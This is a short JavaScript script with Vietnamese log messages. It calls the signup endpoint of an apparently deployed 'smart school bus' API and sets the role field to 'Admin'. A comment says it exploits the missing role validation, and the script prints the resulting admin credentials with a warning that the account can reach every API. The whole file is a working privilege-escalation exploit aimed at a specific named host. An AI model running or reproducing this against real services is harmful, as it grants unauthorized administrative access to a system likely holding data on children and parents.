import axios from 'axios';

const API_URL = 'https://smart-school-bus-api.onrender.com/api/v1';

const newAdmin = {
    name: "Admin Test",
    email: `admin_test_${Date.now()}@gmail.com`,
    phoneNumber: `09${Date.now().toString().slice(-8)}`,
    password: "123",
    role: "Admin" // Exploiting the lack of validation on role
};

async function createAdmin() {
    console.log('--- Bắt đầu tạo tài khoản ADMIN ---');

    try {
        console.log(`Đang đăng ký: ${newAdmin.email}...`);
        const regRes = await axios.post(`${API_URL}/auth/signup`, newAdmin);
        
        if (regRes.status === 201 || regRes.status === 200) {
            console.log('✅ Đăng ký ADMIN THÀNH CÔNG!');
            console.log('------------------------------------------------');
            console.log('👉 TÀI KHOẢN (Email):', newAdmin.email);
            console.log('👉 SỐ ĐIỆN THOẠI:', newAdmin.phoneNumber);
            console.log('👉 MẬT KHẨU:', newAdmin.password);
            console.log('👉 ROLE:', newAdmin.role);
            console.log('------------------------------------------------');
            console.log('⚠️ Tài khoản này có quyền truy cập TẤT CẢ API.');
        }
    } catch (error) {
        console.log('❌ Lỗi:', error.response?.status);
        console.log('Message:', error.response?.data?.msg || error.response?.data?.message || error.message);
    }
}

createAdmin();
